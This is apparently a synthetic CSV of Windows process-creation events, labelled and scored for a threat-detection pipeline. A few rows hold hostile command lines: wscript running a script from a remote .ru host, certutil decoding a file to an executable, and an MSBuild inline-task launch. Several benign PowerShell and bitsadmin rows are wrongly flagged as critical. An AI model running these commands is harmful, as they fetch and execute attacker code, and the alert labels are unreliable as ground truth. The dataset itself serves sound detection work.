UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-02T09:26:26.338Z,{8D04D153-5E98-4164-90A3-87B2EBB1A309},36560,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",31534,CORP\analyst02,Medium,0,,,benign,0,43,0,0,64,4.7524,0,0,0,0,4,0.0,0,0,1,0,0,0,807527952,9,0,0,26,2.058,1.0945686059490847,1.3769205227150312,0,11,1,False,None,none,,28.26350905328802,0,explorer.exe → winword.exe: No known suspicious pattern,False,CLEAR,NONE,9.4,
2024-07-05T17:02:55.074Z,{61B80997-E973-462C-AB63-984CE73B0C0B},13331,C:\Windows\System32\cmd.exe,cmd.exe /c gpupdate /force,C:\Windows\explorer.exe,C:\Windows\explorer.exe,53733,CORP\admin,High,0,,,benign,0,4,1,1,26,3.7962,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,17,0,0,2,0.9208,-0.42900674299103336,-0.05486126003697995,0,3,2,False,None,none,,34.49702174556836,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,11.5,
2024-07-03T08:47:04.560Z,{78586EEF-AF69-4649-861B-19C04E81ADF0},63383,C:\Windows\System32\certutil.exe,certutil.exe -dump C:\Certs\ca_cert.p7b,C:\Windows\System32\cmd.exe,cmd.exe,40471,CORP\sysadmin,High,0,,,gray_area,1,8,1,0,39,4.2311,0,0,0,0,3,0.0,0,0,2,0,0,1,1473216238,8,0,0,47,3.9031,0.09221640269900704,0.5963434014552282,0,10,2,False,None,none,,65.19085752071723,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,CLEAR,NONE,21.7,
2024-07-02T19:56:27.160Z,{6D011AB9-4F72-403D-9F74-1B77ABB31093},4509,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,7636,NT AUTHORITY\SYSTEM,System,0,,,benign,2,9,0,0,34,3.8895,0,0,0,0,2,0.0,0,0,1,0,0,0,392754572,19,0,0,56,1.7891,-0.1082540379510085,0.08484302811483231,1,2,3,False,None,none,,13.766793139295466,0,svchost.exe → usoclient.exe: No known suspicious pattern,False,CLEAR,NONE,4.6,
2024-07-03T16:18:01.514Z,{D482E590-C488-4E05-B255-EDE4E6FB9516},54291,C:\Windows\System32\cmd.exe,cmd.exe /c ipconfig /all,C:\Windows\explorer.exe,C:\Windows\explorer.exe,46734,CORP\dbadmin,Medium,0,,,benign,0,4,1,1,24,3.8554,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,16,0,0,18,0.9208,-0.5091949192510395,0.033782832766742356,0,4,1,False,None,none,,29.221322064562486,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,9.7,
2024-07-01T07:05:09.015Z,{97CA00BD-A615-49EC-802C-6A61332B1BFE},33347,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,15233,NT AUTHORITY\SYSTEM,System,0,,,benign,2,44,0,0,20,3.9842,0,0,0,0,3,0.0,0,0,1,0,0,0,4072695602,7,0,0,5,1.6726,-0.669571271771052,0.22664362927213777,1,2,3,False,None,none,,18.63643647363082,0,svchost.exe → taskeng.exe: No known suspicious pattern,False,CLEAR,NONE,6.2,
2024-07-05T14:05:48.432Z,{63904911-B6EB-4FF4-B011-8A822ED540CF},54149,C:\Windows\System32\certutil.exe,certutil.exe -verifystore My server8,C:\Windows\System32\cmd.exe,cmd.exe,25132,CORP\itops,High,0,,,gray_area,1,8,1,0,36,3.8152,0,0,0,0,4,0.0,0,0,2,0,0,1,1473216238,14,0,0,5,3.9031,-0.02806586169100229,-0.02641129781956895,0,5,2,False,None,none,,63.345265408642575,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,CLEAR,NONE,21.1,
2024-07-04T13:46:50.321Z,{9B978AB7-F7DE-4A0C-8013-5DAA0198D9E8},29599,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",40728,CORP\jsmith,Medium,0,,,benign,0,42,0,0,59,4.4871,0,0,0,0,3,0.0,0,0,1,0,0,0,3033179346,13,0,0,46,1.699,0.8940981652990692,0.9796692081740269,0,9,1,False,None,none,,10.116967284411084,0,explorer.exe → excel.exe: No known suspicious pattern,False,CLEAR,NONE,3.4,
2024-07-01T09:42:22.456Z,{3ACC9DAE-F856-4C86-A031-2E89D97A9721},16751,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,60277,CORP\itops,High,0,,,benign,0,29,0,0,10,2.8464,0,0,0,0,1,0.0,0,0,1,0,0,0,1812276317,9,0,0,42,1.8617,-1.070512153071083,-1.477059897621021,0,5,2,False,None,none,,13.339146109882671,0,explorer.exe → resmon.exe: No known suspicious pattern,False,CLEAR,NONE,4.4,
2024-07-04T17:49:59.904Z,{8FF4C5B0-68F1-4985-8A26-A536FFE8AF08},59264,C:\Windows\System32\cmd.exe,cmd.exe /c nslookup corp.local,C:\Windows\explorer.exe,C:\Windows\explorer.exe,2025,CORP\jsmith,Medium,0,,,benign,0,4,1,1,30,3.8566,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,17,0,0,49,0.9208,-0.26863039047102094,0.03557967248573653,0,9,1,False,None,none,,31.238964231693956,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,10.4,
2024-07-03T11:28:28.982Z,{58050888-72CF-49DC-9DEB-614A2F83E655},27023,C:\Windows\System32\dwm.exe,dwm.exe,C:\Windows\System32\smss.exe,smss.exe,1012,NT AUTHORITY\SYSTEM,System,0,,,benign,8,37,0,0,7,2.5216,0,0,0,0,1,0.0,0,0,1,0,0,0,3089833384,11,0,0,28,2.058,-1.1907944174610925,-1.9634045148954966,1,2,3,False,None,none,,37.321871416521034,0,smss.exe → dwm.exe: No known suspicious pattern,False,CLEAR,NONE,12.4,
2024-07-03T11:41:00.999Z,{8DFEE48F-4EB1-4C4F-8656-FA0EB3491725},11318,C:\Windows\System32\odbcad32.exe,odbcad32.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",6691,CORP\jsmith,Medium,0,,,benign,12,39,0,0,12,3.2516,0,0,0,0,1,0.0,0,0,2,1,0,0,2621902487,11,0,0,41,1.9031,-0.9903239768110769,-0.8703270191739234,0,9,1,False,None,none,,40.6287112586873,0,excel.exe → odbcad32.exe: No known suspicious pattern,False,CLEAR,NONE,13.5,
2024-07-01T21:23:40.912Z,{7B1DBCED-D4EE-45F0-B58C-61CDD908439E},55310,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",31129,CORP\analyst02,Medium,0,,,benign,0,27,0,0,11,3.2776,0,0,0,0,1,0.0,0,0,1,0,0,0,3378330899,21,0,0,23,1.6478,-1.03041806494108,-0.831395491929045,0,11,1,False,None,none,,18.493605027790135,0,explorer.exe → acrobat.exe: No known suspicious pattern,False,CLEAR,NONE,6.2,
2024-07-05T11:46:23.972Z,{46391331-B534-4F71-BED9-F3CC308FBE78},1922,C:\Users\sysadmin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,59458,CORP\sysadmin,High,0,,,benign,0,51,0,0,39,3.5665,0,0,0,0,3,0.0,0,0,1,0,0,0,1222512313,11,0,0,46,1.5809,0.09221640269900704,-0.39880632958115136,0,10,2,False,None,none,,2.2022211013395654,0,explorer.exe → installer.exe: No known suspicious pattern,False,CLEAR,NONE,0.7,
2024-07-05T12:58:35.120Z,{78283B2B-2FE9-4F42-AEE4-488B558B8F7C},18155,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,51788,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign,3,33,0,0,49,4.5173,0,0,0,0,3,0.0,0,0,1,0,0,0,2168783887,12,0,0,58,1.3349,0.49315728399903813,1.0248896744353848,1,7,3,False,None,none,,20.42135353232862,0,services.exe → svchost.exe: No known suspicious pattern,False,CLEAR,NONE,6.8,
2024-07-03T15:28:28.691Z,{56C7D102-5F23-47A3-877A-16D1DEFF1347},15005,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",34500,CORP\netadmin,Medium,0,,,benign,0,35,0,0,8,2.5,0,0,0,0,1,0.0,0,0,1,0,0,0,2236906458,15,0,0,28,1.699,-1.1507003293310893,-1.9957476298373948,0,8,1,False,None,none,,19.337199784003147,0,explorer.exe → calc.exe: No known suspicious pattern,False,CLEAR,NONE,6.4,
2024-07-05T15:21:22.131Z,{0F9F69E1-1425-4B15-8071-D6743144E9F8},44994,C:\Windows\System32\mmc.exe,mmc.exe compmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,43957,CORP\itops,High,0,,,benign,0,30,0,0,20,3.1087,0,0,0,0,2,0.0,0,0,1,0,0,0,2647570127,15,0,0,21,1.6021,-0.669571271771052,-1.0843006823775025,0,5,2,False,None,none,,8.803544930231737,0,explorer.exe → mmc.exe: No known suspicious pattern,False,CLEAR,NONE,2.9,
2024-07-03T19:47:28.564Z,{94C871D8-1C62-4E02-AF24-1826ED15B471},47246,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",29028,CORP\analyst01,Medium,0,,,benign,0,13,0,0,25,3.7835,0,0,0,0,2,0.0,0,0,1,0,0,0,3306193959,19,0,0,47,1.7891,-0.46910083112103645,-0.0738778137296699,0,13,1,False,None,none,,9.877718240066935,0,explorer.exe → chrome.exe: No known suspicious pattern,False,CLEAR,NONE,3.3,
2024-07-01T13:41:06.693Z,{91388240-180B-49FA-8C45-330CEC51FD9A},53432,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,11771,CORP\admin,High,0,,,benign,0,3,1,1,86,4.3913,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,13,0,0,41,1.231,1.976638544809153,0.836221503940977,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,39.62614128142518,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 40 | Chain Risk: 5
2024-07-04T16:50:43.370Z,{185A5564-A3AB-447A-B5F2-9DFB1DB99832},62848,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Common Files\System\Ole DB\oledb32.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,2950,CORP\sysadmin,High,0,,,gray_area,1,19,1,0,71,4.5393,0,0,0,0,6,0.0,0,0,2,0,0,1,2398546659,16,0,0,50,3.9031,1.3752272228591065,1.0578317359502818,0,10,2,False,None,none,,68.00374624968404,55,cmd.exe → regsvr32.exe: Command shell invoking regsvr32,True,CLEAR,NONE,22.7,
2024-07-04T09:13:34.848Z,{00B962B2-CE48-4FCA-AA68-2C49ED8EDE26},47054,C:\Windows\System32\mmc.exe,mmc.exe compmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,58582,CORP\itops,High,0,,,benign,0,30,0,0,20,3.1087,0,0,0,0,2,0.0,0,0,1,0,0,0,2647570127,9,0,0,13,1.6021,-0.669571271771052,-1.0843006823775025,0,5,2,False,None,none,,9.334701938679917,0,explorer.exe → mmc.exe: No known suspicious pattern,False,CLEAR,NONE,3.1,
2024-07-01T16:04:05.346Z,{C7D4C0D8-86A1-471D-96DD-A0C343640F4A},21631,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Common Files\System\Ole DB\oledb32.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,27322,CORP\admin,High,0,,,gray_area,1,19,1,0,71,4.5393,0,0,0,0,6,0.0,0,0,2,0,0,1,2398546659,16,0,0,4,3.9031,1.3752272228591065,1.0578317359502818,0,3,2,False,None,none,,68.00374624968404,55,cmd.exe → regsvr32.exe: Command shell invoking regsvr32,True,CLEAR,NONE,22.7,
2024-07-03T13:42:06.878Z,{57F5F1A2-0B35-4790-B438-7C7C23B0ED33},11539,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",22614,CORP\helpdesk,Medium,0,,,benign,0,10,0,0,11,2.6635,0,0,0,0,1,0.0,0,0,1,0,0,0,1342727496,13,0,0,42,2.1249,-1.03041806494108,-1.7509282181244123,0,14,1,False,None,none,,16.385190937620152,0,explorer.exe → firefox.exe: No known suspicious pattern,False,CLEAR,NONE,5.5,
2024-07-03T18:32:15.285Z,{8071C512-4BC0-476B-B202-B912717D4677},44842,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",32812,CORP\agarwal,Medium,0,,,benign,0,43,0,0,64,4.7524,0,0,0,0,4,0.0,0,0,1,0,0,0,807527952,18,0,0,32,2.058,1.0945686059490847,1.3769205227150312,0,12,1,False,None,none,,30.904223525302385,0,explorer.exe → winword.exe: No known suspicious pattern,False,CLEAR,NONE,10.3,
2024-07-01T01:29:22.159Z,{4F01935A-662C-465A-A7E3-5C23F142D820},10070,C:\Windows\System32\smss.exe,smss.exe,C:\Windows\System32\smss.exe,smss.exe,18366,NT AUTHORITY\SYSTEM,System,0,,,benign,8,26,0,0,8,2.1556,0,0,0,0,1,0.0,0,0,1,0,0,0,3497520200,1,1,0,29,2.301,-1.1507003293310893,-2.511440629188778,1,2,3,False,None,none,,63.09232662994786,10,smss.exe → smss.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,21.0,
2024-07-03T16:42:40.634Z,{827C951F-19D1-4297-9A7F-82D23A1B391C},22966,C:\Program Files\Microsoft VS Code\Code.exe,Code.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",7120,CORP\mjones,Medium,0,,,benign,0,53,0,0,8,2.4056,0,0,0,0,1,0.0,0,0,1,0,0,0,1855645844,16,0,0,42,1.9488,-1.1507003293310893,-2.1370990210649516,0,0,1,False,None,none,,23.089725204301054,0,explorer.exe → code.exe: No known suspicious pattern,False,CLEAR,NONE,7.7,
2024-07-01T17:12:37.558Z,{316B0F49-B278-4E3C-AD5E-A54BB82A9E35},12791,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,45676,CORP\jsmith,Medium,0,,,benign,1,3,1,1,86,4.3913,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,17,0,0,12,1.3846,1.976638544809153,0.836221503940977,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,50.27305175510905,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 50 | Chain Risk: 5
2024-07-03T17:34:47.617Z,{E78AE72D-1AAF-4C8C-B6BD-9704228D4889},13875,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,51865,CORP\admin,High,0,,,benign,0,29,0,0,10,2.8464,0,0,0,0,1,0.0,0,0,1,0,0,0,1812276317,17,0,0,34,1.8617,-1.070512153071083,-1.477059897621021,0,3,2,False,None,none,,15.107777545231908,0,explorer.exe → resmon.exe: No known suspicious pattern,False,CLEAR,NONE,5.0,
2024-07-01T16:27:26.096Z,{9AEABB02-3DE9-40FD-B533-99760E48A138},31451,C:\Windows\System32\certutil.exe,certutil.exe -verify -urlfetch C:\Certs\server18.cer,C:\Windows\System32\cmd.exe,cmd.exe,44309,CORP\itops,High,0,,,gray_area,1,8,1,0,52,4.0525,0,0,0,0,4,0.0,0,0,2,0,0,1,1473216238,16,0,0,27,3.9031,0.6134395483890475,0.3289137566115675,0,5,2,False,None,none,,64.54987568707173,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,CLEAR,NONE,21.5,
2024-07-04T12:41:50.995Z,{CA41E893-DE78-4B4E-B542-108636BF0FFD},51866,C:\Windows\System32\cmd.exe,cmd.exe /c ipconfig /all,C:\Windows\explorer.exe,C:\Windows\explorer.exe,38910,CORP\netadmin,Medium,0,,,benign,0,4,1,1,24,3.8554,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,12,0,0,41,0.9208,-0.5091949192510395,0.033782832766742356,0,8,1,False,None,none,,27.530970336178935,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,9.2,
2024-07-03T09:52:49.963Z,{D6BE0172-A6C6-472D-8B04-A722E278B089},33223,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://darkops2635.ru/script901.js,C:\Windows\System32\cmd.exe,cmd.exe /c,31873,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,58,4.4258,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,9,0,0,52,3.9031,0.8540040771690661,0.8878806458620644,0,6,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,91.32707277907103,75,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.1,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 91 | Chain Risk: 75
2024-07-01T13:56:08.487Z,{437D6260-6FF6-4146-ADFF-B255DCCEF5DE},15076,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb2547674.cab C:\Windows\SoftwareDistribution\Download\update_kb2547674.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,30239,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,177,4.847,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,13,0,0,56,3.9031,5.625200564639437,1.5185713872290882,1,2,3,True,BITSAdmin File Download,high,attack.t1197,90.69000387595567,30,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +5 suspicious flags]",False,ALERT,CRITICAL,99.1,Sigma rule matched: BITSAdmin File Download | ML Score: 91 | Chain Risk: 30
2024-07-04T03:29:42.781Z,{6793FAD1-E0C6-49B2-9645-A57ADBBA21EB},36885,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\module824.csproj,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,12835,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious,4,34,1,0,84,4.9714,0,0,0,0,2,0.0,0,0,2,0,0,1,3004846269,3,1,0,29,3.9031,1.896450368549147,1.7048437714315037,0,0,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.24595425226394,80,powershell.exe → msbuild.exe: PowerShell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.1,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 81 | Chain Risk: 80
2024-07-04T16:33:31.910Z,{BDE09C08-BAD8-4212-B5A5-5E26CD6F4AD2},62509,C:\Windows\System32\cmd.exe,cmd.exe /c net user,C:\Windows\explorer.exe,C:\Windows\explorer.exe,9794,CORP\pchen,Medium,0,,,benign,0,4,1,1,19,3.4714,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,16,0,0,33,0.9208,-0.7096653599010552,-0.5412058773114549,0,1,1,False,None,none,,33.68376927481502,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,11.2,
2024-07-05T15:15:54.230Z,{3FEBCA86-3691-4EDA-9DA0-A4AC46C29511},20709,C:\Windows\System32\cmd.exe,cmd.exe /c gpupdate /force,C:\Windows\explorer.exe,C:\Windows\explorer.exe,57199,CORP\mjones,Medium,0,,,benign,0,4,1,1,26,3.7962,0,0,0,0,4,0.0,0,0,1,0,0,0,2764436884,15,0,0,15,0.9208,-0.42900674299103336,-0.05486126003697995,0,0,1,False,None,none,,27.619482914270584,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,9.2,
2024-07-05T16:25:05.357Z,{F188F58B-1F10-47F4-B91F-DF4254188077},15496,C:\Windows\System32\mmc.exe,mmc.exe devmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,58894,CORP\sysadmin,High,0,,,benign,0,30,0,0,19,3.1761,0,0,0,0,2,0.0,0,0,1,0,0,0,2647570127,16,0,0,25,1.6021,-0.7096653599010552,-0.9833781848273189,0,10,2,False,None,none,,9.450592975435967,0,explorer.exe → mmc.exe: No known suspicious pattern,False,CLEAR,NONE,3.2,
2024-07-01T17:46:24.359Z,{25D4D865-4B24-4D9D-A593-39438582EBCD},64127,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,29140,CORP\admin,High,0,,,benign,0,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,17,0,0,46,1.231,2.0969208091991622,1.599578911227083,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,45.75955222113936,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 46 | Chain Risk: 5
2024-07-01T16:01:27.590Z,{69E70698-8E92-43B2-9CD4-8784AB7BD9D5},21699,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package15.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,37258,CORP\itops,High,0,,,gray_area,1,12,0,0,71,4.3838,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,16,0,0,1,3.9031,1.3752272228591065,0.8249912556972618,0,5,2,False,None,none,,69.85747662621556,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,CLEAR,NONE,23.3,
2024-07-02T13:25:14.912Z,{0C884D83-DAB9-473A-9DC7-B793CF67C809},51603,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,39640,CORP\itops,High,0,,,benign,0,29,0,0,10,2.8464,0,0,0,0,1,0.0,0,0,1,0,0,0,1812276317,13,0,0,25,1.8617,-1.070512153071083,-1.477059897621021,0,5,2,False,None,none,,11.749500505550184,0,explorer.exe → resmon.exe: No known suspicious pattern,False,CLEAR,NONE,3.9,
2024-07-02T13:14:24.583Z,{8652F803-863A-468C-8F2C-1E31E38DBF3A},55615,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,17104,CORP\mjones,Medium,0,,,benign,0,4,1,1,19,3.7216,0,0,0,0,3,0.0,0,0,1,0,0,0,2764436884,13,0,0,14,0.9208,-0.7096653599010552,-0.16656479590112944,0,0,1,False,None,none,,29.47473783016372,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,9.8,
2024-07-02T08:25:12.643Z,{E976C1EF-DBCF-45B6-B36E-9A79C39543FA},21024,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded9073.txt C:\Users\Public\decoded5453.exe,C:\Windows\System32\cmd.exe,cmd.exe,21560,CORP\agarwal,Medium,1,T1140,Certutil Base64 Decode,malicious,1,8,1,0,80,4.4313,1,0,0,0,4,0.25,0,0,2,0,0,1,1473216238,8,0,0,25,3.9031,1.7360740160291346,0.8961161612407894,0,12,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,90.7662479455103,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,ALERT,CRITICAL,99.1,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 91 | Chain Risk: 50
2024-07-01T08:41:20.105Z,{48CD4603-9025-4258-AD25-645C060A2D81},47120,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,64467,CORP\sysadmin,High,0,,,benign,0,29,0,0,10,2.8464,0,0,0,0,1,0.0,0,0,1,0,0,0,1812276317,8,0,0,41,1.8617,-1.070512153071083,-1.477059897621021,0,10,2,False,None,none,,14.307672252108649,0,explorer.exe → resmon.exe: No known suspicious pattern,False,CLEAR,NONE,4.8,
2024-07-05T12:10:46.702Z,{7DC9B548-ACF5-453D-A749-E7387DE6CC65},23457,C:\Windows\System32\odbcad32.exe,odbcad32.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",61447,CORP\netadmin,Medium,0,,,benign,12,39,0,0,12,3.2516,0,0,0,0,1,0.0,0,0,2,1,0,0,2621902487,12,0,0,10,1.9031,-0.9903239768110769,-0.8703270191739234,0,8,1,False,None,none,,39.76582614512558,0,excel.exe → odbcad32.exe: No known suspicious pattern,False,CLEAR,NONE,13.3,
2024-07-05T17:30:45.672Z,{A58589EC-1117-4C03-8291-2402C2CD5921},24808,C:\Users\sysadmin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,47918,CORP\sysadmin,High,0,,,benign,0,23,0,0,18,3.5305,0,0,0,0,3,0.0,0,0,1,0,0,0,2635501913,17,0,0,30,1.6726,-0.7497594480310582,-0.4527115211509824,0,10,2,False,None,none,,6.51915987565027,0,explorer.exe → setup.exe: No known suspicious pattern,False,CLEAR,NONE,2.2,
2024-07-03T19:09:04.129Z,{6B72DDBB-519F-47E6-BC1A-1B91523BAF8B},19023,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,41915,NT AUTHORITY\SYSTEM,System,0,,,benign,3,33,0,0,50,4.6713,0,0,0,0,4,0.0,0,0,1,0,0,0,2168783887,19,0,0,9,1.3349,0.5332513721290413,1.2554841050396617,1,2,3,False,None,none,,27.740000981299556,0,services.exe → svchost.exe: No known suspicious pattern,False,CLEAR,NONE,9.2,
